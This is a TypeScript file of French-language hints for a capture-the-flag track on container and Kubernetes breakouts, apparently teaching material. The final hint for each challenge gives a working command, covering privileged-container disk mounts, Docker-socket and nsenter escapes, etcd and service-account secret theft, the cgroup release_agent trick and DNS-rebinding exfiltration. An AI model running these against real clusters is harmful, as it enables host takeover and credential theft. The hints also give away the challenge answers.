/** Indices détaillés (3 par challenge) — Track 4. */
export const hints: Record<string, string[]> = {
  "4.1.1": [
    "Indice 1 : Ce conteneur a été lancé en mode privilégié. Demandez-vous à quels périphériques de l'hôte vous pourriez accéder depuis l'intérieur. Un conteneur normal n'a pas ce genre d'accès.",
    "Indice 2 : Listez les disques de la machine hôte avec `fdisk -l`. Si vous voyez une partition comme `/dev/sda1` ou `/dev/vda1`, c'est gagné : vous pouvez la monter. Pensez à créer un point de montage avec `mkdir /mnt/host`.",
    "Indice 3 : Montez la partition principale de l'hôte avec `mount /dev/vda1 /mnt/host` (essayez `/dev/sda1` si besoin), puis explorez le système de l'hôte. Le flag se trouve généralement dans `cat /mnt/host/root/flag.txt`.",
  ],
  "4.1.2": [
    "Indice 1 : Le socket Docker de l'hôte a été monté à l'intérieur de ce conteneur. Parler au daemon Docker de l'hôte revient à pouvoir lancer de nouveaux conteneurs comme bon vous semble.",
    "Indice 2 : Vérifiez la présence du socket avec `ls -la /var/run/docker.sock`. S'il est là, installez le client Docker si nécessaire (`apt-get update && apt-get install -y docker.io`) pour dialoguer avec lui.",
    "Indice 3 : Lancez un conteneur d'évasion qui monte la racine de l'hôte : `docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash`. Vous êtes root sur l'hôte, lisez ensuite `cat /root/flag.txt`.",
  ],
  "4.1.3": [
    "Indice 1 : Ce conteneur partage des namespaces avec l'hôte (mount, PID...). Si vous voyez les processus de l'hôte, vous pourriez aussi rejoindre son système de fichiers.",
    "Indice 2 : Lancez `ps aux` : si le namespace PID est partagé, vous verrez le PID 1 de l'hôte (`init` ou `systemd`). L'outil `nsenter` permet d'entrer dans les namespaces d'un autre processus.",
    "Indice 3 : Rejoignez les namespaces du PID 1 avec `nsenter -t 1 -m -u -n -i sh` pour obtenir un shell sur l'hôte, puis lisez `cat /root/flag.txt`.",
  ],
  "4.2.2": [
    "Indice 1 : Le Kubernetes Dashboard est parfois exposé sans demander de token, voire avec des droits cluster-admin par défaut. Commencez par localiser où ce service écoute.",
    "Indice 2 : Repérez le service et son NodePort avec `kubectl get svc -n kubernetes-dashboard`, puis tentez d'y accéder via `curl -k https://<node_ip>:<node_port>/`. Remarquez si l'interface propose de passer (Skip) l'authentification.",
    "Indice 3 : Une fois dans le Dashboard (ou via les permissions qu'il accorde), parcourez les secrets : `kubectl get secrets -n default`. Le flag s'y cache.",
  ],
  "4.2.3": [
    "Indice 1 : etcd est la base clé-valeur qui stocke tout l'état du cluster, y compris les secrets. Si elle n'est pas chiffrée au repos, les secrets sont lisibles en clair.",
    "Indice 2 : Installez le client avec `apt-get install -y etcd-client`. Avec `etcdctl` (API v3) et les certificats sous `/etc/kubernetes/pki/etcd/`, listez les clés : cherchez celles sous `/registry/secrets/`.",
    "Indice 3 : Lisez directement le secret : `ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_ip>:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key get /registry/secrets/default/flag-secret`. Le flag est dans la valeur brute.",
  ],
  "4.2.4": [
    "Indice 1 : Chaque Pod a un Service Account dont le token est souvent monté automatiquement dans le conteneur. Si ce SA a trop de droits, ce token devient une clé vers l'API du cluster.",
    "Indice 2 : Récupérez le token JWT : `cat /var/run/secrets/kubernetes.io/serviceaccount/token`. Servez-vous-en pour interroger l'API et lister vos droits (selfsubjectrulesreviews) afin de comprendre ce que vous pouvez lire.",
    "Indice 3 : Appelez l'API des secrets avec le token : `curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets`. Le flag est dans la réponse.",
  ],
  "4.3.2": [
    "Indice 1 : L'Ingress route le trafic HTTP entrant. Une règle de chemin trop large ou une annotation dangereuse peut exposer un service interne qui ne devrait jamais être accessible de l'extérieur.",
    "Indice 2 : Inspectez les règles avec `kubectl get ingress -A -o yaml`. Cherchez des annotations comme `nginx.ingress.kubernetes.io/configuration-snippet` ou un Host/chemin pointant vers un service interne.",
    "Indice 3 : Forcez le routage vers le service interne en jouant sur l'en-tête Host, par ex. `curl -H \"Host: internal-service.local\" http://<ingress_ip>/`, puis atteignez le endpoint du flag (type `/internal-flag-endpoint`).",
  ],
  "4.3.3": [
    "Indice 1 : Le DNS rebinding consiste à faire pointer un même domaine d'abord vers votre serveur, puis très vite vers une IP interne du cluster (kube-api local, metadata...) pour contourner les protections d'origine.",
    "Indice 2 : Configurez un domaine avec un TTL très court qui renvoie votre IP publique, puis l'IP interne de la cible. Faites consulter ce domaine par le service vulnérable : `curl http://<domaine_malveillant>/`.",
    "Indice 3 : Après la seconde résolution (le rebinding vers l'IP interne), votre payload requête la cible et exfiltre les données. Récupérez le résultat dans votre fichier de sortie (ex: `cat exfiltrated_data.txt`) : le flag y figure.",
  ],
  "4.4.2": [
    "Indice 1 : Ce Pod possède une capability Linux très puissante, presque équivalente à `--privileged`. Identifiez laquelle : certaines permettent de monter des systèmes de fichiers ou d'agir sur les cgroups.",
    "Indice 2 : Vérifiez vos capabilities avec `capsh --print` et cherchez `cap_sys_admin` dans les Current capabilities. Avec elle, la technique classique passe par les cgroups et le `release_agent`.",
    "Indice 3 : Créez un cgroup (`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`), placez un script via `release_agent`, par ex. `echo 'cat /flag > /tmp/output' >> /cmd ; chmod a+x /cmd`. Le noyau l'exécute en root et vous lisez la sortie dans `/tmp/output`.",
  ],
  "4.4.3": [
    "Indice 1 : Un Admission Controller (PSP / Pod Security Admission) est censé empêcher la création de Pods dangereux. Mais une politique permissive accessible à votre compte peut être détournée.",
    "Indice 2 : Listez les politiques avec `kubectl get psp` pour voir ce qui est autorisé (hostNetwork, hostPID, RunAsUser...), puis vérifiez vos droits : `kubectl auth can-i use psp/<privileged_psp_name>`.",
    "Indice 3 : Profitez de la PSP permissive pour déployer un pod qui monte `/root` de l'hôte (`kubectl apply -f bad-pod.yaml`), puis lisez le flag : `kubectl exec -it <bad_pod> -- cat /host-root/flag.txt`.",
  ],
};
